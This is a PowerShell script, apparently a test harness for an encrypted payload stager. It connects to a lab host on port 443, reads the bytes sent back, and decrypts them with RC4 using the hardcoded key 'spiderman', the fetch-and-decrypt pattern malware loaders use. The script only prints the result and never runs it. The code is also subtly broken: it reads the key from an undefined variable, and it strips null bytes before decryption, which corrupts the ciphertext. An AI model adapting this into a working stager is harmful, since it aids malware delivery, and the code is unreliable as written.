param( [string] $remoteHost = "192.168.56.101", [int] $port = 443) 

function rc4 {
	param(
    	[Byte[]]$data,
    	[Byte[]]$key
  	)
 
	# Make a copy of the input data
	[Byte[]]$buffer = New-Object Byte[] $data.Length
	$data.CopyTo($buffer, 0)
	
	[Byte[]]$s = New-Object Byte[] 256;
    [Byte[]]$k = New-Object Byte[] 256;
 
    for ($i = 0; $i -lt 256; $i++)
    {
        $s[$i] = [Byte]$i;
        $k[$i] = $key[$i % $key.Length];
    }
 
    $j = 0;
    for ($i = 0; $i -lt 256; $i++)
    {
        $j = ($j + $s[$i] + $k[$i]) % 256;
        $temp = $s[$i];
        $s[$i] = $s[$j];
        $s[$j] = $temp;
    }
 
    $i = $j = 0;
    for ($x = 0; $x -lt $buffer.Length; $x++)
    {
        $i = ($i + 1) % 256;
        $j = ($j + $s[$i]) % 256;
        $temp = $s[$i];
        $s[$i] = $s[$j];
        $s[$j] = $temp;
        [int]$t = ($s[$i] + $s[$j]) % 256;
        $buffer[$x] = $buffer[$x] -bxor $s[$t];
    }
 
	return $buffer
}


function BinToHex {
	param(
    [Parameter(
        Position=0, 
        Mandatory=$true, 
        ValueFromPipeline=$true)
	]
	[Byte[]]$Bin)
	# assume pipeline input if we don't have an array (surely there must be a better way)
	if ($bin.Length -eq 1) {$bin = @($input)}
	$return = -join ($Bin |  foreach { "{0:X2}" -f $_ })
	Write-Output $return
}
 
function HexToBin {
	param(
    [Parameter(
        Position=0, 
        Mandatory=$true, 
        ValueFromPipeline=$true)
	]	
	[string]$s)
	$return = @()
	
	for ($i = 0; $i -lt $s.Length ; $i += 2)
	{
		$return += [Byte]::Parse($s.Substring($i, 2), [System.Globalization.NumberStyles]::HexNumber)
	}
	
	Write-Output $return
}


try {

	Write-Host "Connecting to $remoteHost on port $port ... " -NoNewLine

	try {

		$socket = New-Object System.Net.Sockets.TcpClient( $remoteHost, $port )
		Write-Host -ForegroundColor Green "OK"

	}

	catch {

		Write-Host -ForegroundColor Red "failed"
		exit -1

	}

	$stream = $socket.GetStream( )
	$buffer = New-Object System.Byte[] 2048
	$encoding = New-Object System.Text.AsciiEncoding
    $data = ""

	start-sleep -m 500
	while( $stream.DataAvailable ) {

		$read = $stream.Read( $buffer, 0, 2048 )            

	}

}

finally {

    #close the stream
	if( $stream ) {	$stream.Close( ) }

    #remove null bytes in the payload
    $payload_encrypted = $buffer | ? {$_ -ne 0x00}
    
    Write-Host ''
    Write-Host 'Encrypted received payload '
    $Hex = BinToHex $payload_encrypted
    Write-Host $Hex

    #decrypt RC4 payload
    $key = $Enc.GetBytes('spiderman')
    $payload_decrypted = rc4 $payload_encrypted $key

    Write-Host ''
    Write-Host 'Decrypted received payload '
    Write-Host ''
    $Hex = BinToHex $payload_decrypted
    Write-Host $Hex 

    
} 